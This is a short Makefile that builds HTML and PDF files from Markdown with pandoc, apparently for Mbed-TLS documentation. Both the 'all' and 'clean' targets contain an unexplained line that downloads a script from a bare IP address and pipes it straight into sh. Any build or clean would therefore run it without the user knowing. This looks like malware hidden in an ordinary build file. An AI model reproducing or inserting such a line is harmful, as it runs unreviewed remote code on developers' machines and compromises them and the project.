PANDOC = pandoc

default: all

all_markdown = $(wildcard *.md */*.md)

html: $(all_markdown:.md=.html)
pdf: $(all_markdown:.md=.pdf)
all: html pdf
	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls

.SUFFIXES:
.SUFFIXES: .md .html .pdf

.md.html:
	$(PANDOC) -o $@ $<
.md.pdf:
	$(PANDOC) -o $@ $<

clean:
	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
	rm -f *.html *.pdf
	rm -f testing/*.html testing/*.pdf
